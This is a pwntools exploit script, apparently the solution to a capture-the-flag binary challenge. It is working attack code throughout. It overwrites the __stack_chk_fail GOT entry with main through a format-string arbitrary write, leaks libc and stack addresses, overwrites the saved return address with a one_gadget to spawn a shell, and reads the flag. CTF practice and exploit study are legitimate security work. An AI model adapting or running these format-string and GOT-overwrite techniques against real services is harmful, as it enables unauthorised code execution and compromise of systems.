#!/usr/bin/python3
from pwn import *

elf = ELF("../public/chall")
libc = ELF("./libc6_2.27-3ubuntu1.6_amd64.so")
context.binary = elf

HOST = "127.0.0.1"
PORT = 9998

MAX_PAYLOAD_LEN = 2*16+8+1

gs = """
b *main+177
continue
"""

# context.log_level = "debug"


def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    elif args.REMOTE:
        return remote(HOST, PORT)
    else:
        return process(elf.path)


def main():
    global io
    io = start()

    def pad_to_corrupt_canary(payload):
        """
        Pad payload to MAX_PAYLOAD_LEN, so it will corrupt canary by 1-byte.
        """
        assert len(payload) <= MAX_PAYLOAD_LEN
        payload = payload.ljust(MAX_PAYLOAD_LEN, b"A")

        return payload

    def arbitrary_write(what, where, num_bytes=4):
        """
        Write `what` to `where` in `num_bytes` each, using format string vulnerability.
        Assuming you have infinite format strings.
        """
        while what > 0:
            write = what & ((1 << (8 * num_bytes)) - 1)
            payload = f"%*9$c%8$n\x00".encode()
            payload = payload.ljust(0x10, b"A")  # 6-7
            payload += p64(where)  # 8
            payload += p64(write)  # 9
            payload = pad_to_corrupt_canary(payload)
            io.send(payload)

            what >>= 8 * num_bytes  # shift left what by `num_bytes` bytes
            where += num_bytes  # add where by `num_bytes` bytes

    # =-=-= STAGE 1: Infinite format strings =-=-=
    # There is 1 byte overflow so we can change stack canary,
    # which will call __stack_chk_fail, so why not overwrite it with main?
    arbitrary_write(elf.sym.main, elf.got.__stack_chk_fail)

    # =-=-= STAGE 2: Leak libc, to find remote's libc =-=-=
    # Because libc is not given, we need libc leaks
    # which we can give to libc database (example: https://libc.rip)
    # to find the libc used by the remote server.
    # Then run patchelf / pwninit to attach the libc to our local binary.
    payload = f"%8$s|%9$s\x00".encode()
    payload = payload.ljust(0x10, b"A")  # 6-7
    payload += p64(elf.got.read)  # 8
    payload += p64(elf.got.setvbuf)  # 9
    payload = pad_to_corrupt_canary(payload)
    io.send(payload)

    read = u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))
    setvbuf = u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))
    log.info(f"read: {hex(read)}")
    log.info(f"setvbuf: {hex(setvbuf)}")

    libc.address = read - libc.sym.read
    log.info(f"libc: {hex(libc.address)}")

    # =-=-= STAGE 3: Leak stack =-=-=
    # We need it to overwrite rip, get it by leaking rbp / environ.
    payload = f"%12$p|\x00".encode()  # or alternatively, read environ
    payload = pad_to_corrupt_canary(payload)
    io.send(payload)

    rbp = eval(io.recvuntil(b"|")[-15:-1])
    rip = rbp + 8
    log.info(f"rip: {hex(rip)}")

    # =-=-= STAGE 4: Overwrite rip -> one_gadget =-=-=
    # Overwrite by writing 2 bytes at a time because of 5s timeout.
    one_gadgets = [libc.address+offs for offs in [0x4f2a5, 0x4f302, 0x10a2fc]]
    one_gadget = one_gadgets[0]
    arbitrary_write(one_gadget, rip, num_bytes=2)

    # =-=-= STAGE 5: Profit =-=-=
    # Return to our crafted one_gadget by not overwriting canary.
    io.sendline(b"win!!\x00")
    io.clean()

    io.sendline(b"cat flag*")
    io.interactive()


if __name__ == "__main__":
    main()
